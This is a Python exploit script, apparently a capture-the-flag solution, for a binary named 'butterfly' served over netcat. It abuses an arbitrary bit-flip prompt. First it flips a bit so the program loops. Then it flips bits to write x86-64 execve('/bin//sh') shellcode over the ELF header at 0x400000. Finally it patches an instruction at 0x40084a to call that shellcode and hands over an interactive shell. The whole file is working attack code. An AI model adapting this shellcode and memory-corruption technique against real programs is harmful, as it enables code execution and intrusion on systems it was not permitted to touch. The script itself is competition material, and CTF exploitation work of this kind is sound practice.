#!/usr/bin/env python3

import pexpect

#BINARY = './butterfly_33e86bcc2f0a21d57970dc6907867bed'
BINARY= 'nc butterfly.pwning.xxx 9999'

shellcode='\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05'
elfheader='\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3e\x00\x01\x00\x00\x00\x90\x06\x40\x00\x00\x00\x00\x00\x40\x00'
textseg=0x400000

oldinst='\x45\x31\xf6\x64\x48'
newinst='\xe8\xb1\xf7\xff\xff'
addr=0x40084a


flip_loopy_bit = '33571270'

def make_payload(shellcode, test_data, start_loc):
    s_barry=bytearray()
    t_barry=bytearray()
    s_barry.extend(map(ord,shellcode))
    t_barry.extend(map(ord,test_data))


    pwnarray=list()
    for i in range(0,len(shellcode)):
        curr_loc= start_loc + i
        # print(hex(curr_loc))
        xor_result=t_barry[i] ^ s_barry[i]

        fxor_r=format(xor_result,'b').zfill(8)
 #       print(fxor_r)
        for j in range(0,8):
            if fxor_r[j:j+1] == '1' :
 #               print("0x%x %i" % (curr_loc, (7-j)))
                pwnarray.append(str(curr_loc * 8 + (7-j)))

    return pwnarray



cosmic_array = [flip_loopy_bit] + make_payload(shellcode, elfheader, textseg)+\
        make_payload(oldinst, newinst, addr) + [flip_loopy_bit]

#print(cosmic_array)


child = pexpect.spawnu(BINARY)
for cosmic_ray in cosmic_array:
    child.expect('THOU ART GOD, WHITHER CASTEST THY COSMIC RAY\\?\r\n')
    child.sendline(cosmic_ray)

child.interact()
